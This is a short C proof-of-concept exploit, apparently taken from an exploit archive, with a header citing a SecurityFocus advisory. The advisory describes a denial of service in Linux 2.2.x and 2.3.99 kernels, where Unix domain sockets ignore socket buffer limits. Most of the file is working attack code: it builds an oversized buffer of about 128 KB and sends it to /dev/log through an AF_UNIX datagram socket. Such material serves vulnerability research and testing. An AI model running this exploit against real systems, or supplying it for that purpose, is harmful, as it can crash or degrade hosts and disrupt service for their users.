/*
source: http://www.securityfocus.com/bid/1072/info

A denial of service exists in Linux kernels, as related to Unix domain sockets ignoring limits as set in /proc/sys/net/core/wmem_max. By creating successive Unix domain sockets, it is possible to cause a denial of service in some versions of the Linux kernel. Versions 2.2.12, 2.2.14, and 2.3.99-pre2 have all been confirmed as being vulnerable. Previous kernel versions are most likely vulnerable. 
*/


#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>

char buf[128 * 1024];

int main ( int argc, char **argv )
{
struct sockaddr SyslogAddr;
int LogFile;
int bufsize = sizeof(buf)-5;
int i;

for ( i = 0; i < bufsize; i++ )
buf[i] = ' '+(i%95);
buf[i] = '\0';

SyslogAddr.sa_family = AF_UNIX;
strncpy ( SyslogAddr.sa_data, "/dev/log", sizeof(SyslogAddr.sa_data) );
LogFile = socket ( AF_UNIX, SOCK_DGRAM, 0 );
sendto ( LogFile, buf, bufsize, 0, &SyslogAddr, sizeof(SyslogAddr) );
return 0;
} 